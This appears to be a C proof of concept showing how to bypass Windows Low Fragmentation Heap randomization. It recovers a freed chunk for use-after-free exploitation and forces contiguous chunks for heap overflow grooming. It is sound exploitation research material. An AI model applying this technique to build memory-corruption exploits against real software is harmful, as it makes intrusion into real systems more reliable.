#include "Defs.h"
#include <stdio.h>
#include <Windows.h>


int main(void) {
	HANDLE hHeap;
	
	hHeap = HeapCreate(0x0, 0x0, 0x0);
	printf("[*] activate LFH bucket for size 0x%x\n", SIZE);
	if (activateLFHBucket(hHeap, SIZE) < 0) {
		printf("[*] Error activating LFH bucket\n");
		return -1;
	}

	printf("\n---------------------Check randomization----------------------------------\n");
	checkRandomization(hHeap, SIZE);

	printf("\n-------------------------UAF Exploit--------------------------------------\n");
	getFreedChunk(hHeap, SIZE);
	printf("\n---------------------Contiguous Exploit-----------------------------------\n");
	getContiguousAllocations(hHeap, SIZE);
	return 0;
}

void checkRandomization(HANDLE hHeap, size_t size) {
	LPVOID chunk, chunk2;

	/* Check for UAF */
	chunk = HeapAlloc(hHeap, 0x0, size);
	HeapFree(hHeap, 0x0, chunk);
	chunk2 = HeapAlloc(hHeap, 0x0, size);

	if (chunk != chunk2) {
		printf("[*] Good, different allocations:\n\t0x%p\n\t0x%p\n", chunk, chunk2);
	}
	else {
		printf("[*] Odd...same allocations\n");
	}

	/* check for contiguous*/
	chunk = HeapAlloc(hHeap, 0x0, size);
	chunk2 = HeapAlloc(hHeap, 0x0, size);

	if (chunk != (LPVOID)((char*)chunk2 - (size + HEAP_ENTRY_SIZE))) {
		printf("[*] Good, non contiguous allocations:\n\t0x%p\n\t0x%p\n", chunk, chunk2);
	}
	else {
		printf("[*] Odd...contiguous allocations\n\t0x%p\n\t0x%p\n", chunk, chunk2);
	}
}

/*
	Activate LFH bucket for certain size.
	For the first time, 0x12 contiguous allocations have to be done,
	afterwords, 0x11 contiguous allocations have to be done.
	For safety, let's go on 0x12.
*/
STATUS activateLFHBucket(HANDLE hHeap, size_t size) {
	for (size_t i = 0; i < 0x12; ++i) {
		if (!HeapAlloc(hHeap, 0x0, size)) {
			return FAIL;
		}
	}
	return SUCCESS;
}

/*
	For UAF exploits, we would like the following stub:
		p = malloc(size)
		...
		free(p)
		...
		p2 = malloc(size)
	return the same chunk (p == p2).
	So, take advantage on the fact of the 0x100 length of the randomDataArray
*/
STATUS getFreedChunk(HANDLE hHeap, size_t size) {
	LPVOID chunk, tmp_chunk;
	
	chunk = HeapAlloc(hHeap, 0x0, size);
	HeapFree(hHeap, 0x0, chunk);
	printf("[*] Chunk 0x%p is freed in the userblocks for bucket size 0x%x\n", chunk, size);

	for (size_t i = 0; i < RandomDataArrayLength - 1; ++i) {
		tmp_chunk = HeapAlloc(hHeap, 0x0, size);
		if (!tmp_chunk) {
			return FAIL;
		}
		HeapFree(hHeap, 0x0, tmp_chunk);
	}

	tmp_chunk = HeapAlloc(hHeap, 0x0, size);
	if (chunk == tmp_chunk) {
		printf("[*] Success! chunk 0x%p is returned!\n", tmp_chunk);
	}
	else {
		printf("[*] Fail, chunk 0x%p is returned\n", tmp_chunk);
	}

	return SUCCESS;
}

/*
	For currptions exploits (different varios of heapo's, for example),
	we would like to shape the heap to be like this:

		... [spray][spray][spray][vuln_chunk][override_chunk][spray][spray]

	This is quite difficult with the randomization in the LFH bitmap.
	So, again, take advantage on the fact of the 0x100 length of the randomDataArray.
	Explanation in the README.md file.
*/
STATUS getContiguousAllocations(HANDLE hHeap, size_t size) {
	LPVOID chunk, tmp_chunk;

	chunk = HeapAlloc(hHeap, 0x0, size);
	printf("[*] Chunk 0x%p is freed in the userblocks for bucket size 0x%x\n", chunk, size);

	for (size_t i = 0; i < RandomDataArrayLength - 1; ++i) {
		tmp_chunk = HeapAlloc(hHeap, 0x0, size);
		if (!tmp_chunk) {
			return FAIL;
		}
		HeapFree(hHeap, 0x0, tmp_chunk);
	}

	tmp_chunk = HeapAlloc(hHeap, 0x0, size);
	if (chunk == (LPVOID)((char*)tmp_chunk - (size + HEAP_ENTRY_SIZE))) {
		printf("[*] Success! 0x%p chunk is returned!\n", tmp_chunk);
	}
	else {
		printf("[*] Fail, 0x%p chunk is returned\n", tmp_chunk);
	}

	return SUCCESS;
}